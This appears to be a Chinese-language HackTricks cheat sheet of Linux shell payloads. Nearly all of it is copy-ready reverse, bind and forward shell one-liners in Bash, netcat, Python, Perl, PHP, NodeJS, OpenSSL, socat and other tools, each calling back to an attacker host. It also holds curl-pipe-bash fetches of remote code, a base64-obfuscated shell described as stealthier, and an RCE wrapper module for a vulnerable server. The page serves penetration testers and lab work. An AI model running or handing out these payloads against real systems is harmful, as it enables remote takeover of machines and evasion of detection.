# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**如果你对这些 Shell 有疑问，可以通过** [**https://explainshell.com/**](https://explainshell.com/)**进行检查。**<sup>[[9]](#references)</sup>

## 完整 TTY

**获取 reverse shell 后，**[**阅读此页面以获得完整 TTY**](full-ttys.md)**。**

以下收集的基础 reverse-shell payload 也记录在 HighOn.Coffee 和 PayloadsAllTheThings 的备忘单中；选择 payload 前，请确认目标上是否有相应的解释器和实用工具。<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

别忘了也用其他 shell 测试：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。

### 符号安全的 shell

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Shell 说明

以下几点总结了 Bash 文档中关于交互模式和重定向的行为：<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**：命令的这一部分会启动一个交互式（`-i`）Bash shell。
2. **`>&`**：命令的这一部分是简写，表示将**标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目标**。
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**：这是一个特殊文件，**表示与指定 IP 地址和端口建立的 TCP 连接**。
   - 通过将**输出和错误流重定向到此文件**，该命令实际上会将交互式 shell 会话的输出发送到攻击者的机器。
4. **`0>&1`**：命令的这一部分会将**标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。

### 创建文件并执行

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

当 RCE 可用，但反向 shell 被防火墙、NAT 或出站过滤阻止时，可以通过 RCE 通道使用 forward shell 来建立半交互式会话。<sup>[[12]](#references)</sup>

推荐用于此目的的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它可以将命令执行原语封装成交互式会话。<sup>[[12]](#references)</sup>

要使用 toboggan，请针对目标系统的 RCE 场景创建一个 Python 模块；其模块接口需要一个 `execute(command, timeout)` 函数，该函数会返回命令输出。<sup>[[12]](#references)</sup> 例如，名为 `nix.py` 的模块可以按如下方式编写：

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

以 toboggan 当前的命令行形式运行该模块：<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

这会启动交互式会话。对于内置的 Burp Suite 后端，使用 `toboggan --request burp_request.xml`；对于 command-wrapper 后端，使用 `toboggan --exec-wrapper '<command_template>'`。<sup>[[12]](#references)</sup>

另一种选择是 `IppSec` 的 forward-shell 实现 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。<sup>[[13]](#references)</sup>

你需要修改以下部分：<sup>[[13]](#references)</sup>

- 易受攻击主机的 URL
- payload 的前缀和后缀（如果有）
- payload 的发送方式（headers？data？额外信息？）

然后，你可以**发送命令**，或使用 **`upgrade` 命令**获取完整的 PTY；该实现会以大约 1.3 秒的间隔轮询输出。<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox 将许多实用工具整合到一个小型可执行文件中，常见于小型或嵌入式 Linux 系统。如果没有独立的 `nc`，请检查 BusyBox 是否提供该工具：<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

如果存在 `busybox nc`，但交互式执行不稳定，可以将 `nc` 部分中的 FIFO 模式改用于该 applet：<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

请查看官方部署说明：[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)。<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**攻击者**

```bash
while true; do nc -l <port>; done
```

使用 Whois 部分中描述的相同 Enter/CTRL+D 输入序列。<sup>[[3]](#references)</sup>

**受害者**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### 通过显式出站代理

如果目标可以访问 HTTP `CONNECT` 或 SOCKS 代理，但无法与 listener 建立直接的 TCP 连接，请使用 **Ncat** 的 connect 模式。代理必须允许隧道连接到 listener 的主机和端口；`CONNECT` 只会在建立连接后转发字节，因此普通 shell 流量**不会**因为使用了 HTTP 代理就变成 HTTP 流量，也不会因此加密。<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

对于需要身份验证的代理，Ncat 接受 `--proxy-auth` 或 `NCAT_PROXY_AUTH`（后者可避免将凭据放在命令参数中）。<sup>[[23]](#references)</sup> 默认情况下，代理会解析目标主机名；仅在需要本地解析时使用 `--proxy-dns local`。<sup>[[23]](#references)</sup> 如果代理强制要求 TLS 或 `CONNECT` 之外的应用层协议，请使用适当的加密传输，不要想当然地认为端口 443 能伪装原始 shell；WebSocket 传输请参阅[隧道与端口转发](../tunneling-and-port-forwarding.md)。<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh（内置 TCP）

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – 用 Rust 编写的现代 netcat 类监听器。<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

项目文档中列出的功能包括：<sup>[[5]](#references)</sup>
- 交互模式下的命令历史记录和 Tab 补全
- 使用 `-s` 选择 `connect` 使用的 shell 可执行文件

## pwncat-cs

如果你已经有**任意原始 reverse shell**，但想要一个能建立更实用会话的监听器，`pwncat-cs` 可以处理连接并尝试分配远程 PTY。<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

它还支持 **加密**的 `ssl-bind` 和 `ssl-connect` 通道，因此在需要传输加密时，可以将其与 `ncat --ssl` 或 `socat OPENSSL:` payload 配合使用。<sup>[[7]](#references)</sup>

## revsh（加密且适合 pivot）

`revsh` 是一个小型 C 客户端/服务器，可通过**加密的 Diffie-Hellman 隧道**提供完整的 TTY，并可选地连接 **TUN/TAP** 接口，以实现类似 reverse VPN 的 pivot。<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

`revsh` 记录的实用标志包括：<sup>[[6]](#references)</sup>
- `-b`：bind-shell 模式（两端都启用）
- `-D [LHOST:]LPORT` 或 `-B [RHOST:]RPORT`：动态 SOCKS 4/4a/5 转发
- `-x`：禁用代理的自动设置，包括默认的 TUN/TAP 设置

加密隧道可以避免 shell 流量以明文形式暴露，但本身并不能绕过网络策略。<sup>[[6]](#references)</sup>

## OpenSSL

本节使用 OpenSSL 的 `req`、`s_server` 和 `s_client` 命令创建证书，并通过 TLS 传输 shell。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

攻击者（Kali）

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

受害者

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

如果你希望输入/输出通道分离，仍然可以使用经典的 **two-listener** 模式。<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**攻击者**

```bash
while true; do nc -l 79; done
```

要发送命令，请输入命令，按 Enter，然后按 CTRL+D（以停止 STDIN）。<sup>[[3]](#references)</sup>

**受害者**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

这将尝试连接到你系统的 6001 端口。<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

要捕获 reverse shell，请使用监听 6001 端口的 X server，如下所示。<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

作者：[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)。注意：Java reverse shell 也适用于 Groovy。<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Reverse Shell 速查表：PHP、ASP、Netcat、Bash 和 Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell 速查表](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [使用 Whois 和 Finger 实现 Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell 速查表](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - 现代化端口监听器和 Reverse Shell](https://github.com/robiot/rustcat)
- [6] [revsh - 支持终端、数据隧道和高级 pivoting 功能的 Reverse Shell](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation 平台](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash 参考手册：重定向](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash 参考手册：调用 Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket 部署说明](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [纯 Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Ncat 代理](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Ncat 命令执行](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110：CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Ncat 参考指南](https://nmap.org/book/ncat-man.html)
- [24] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
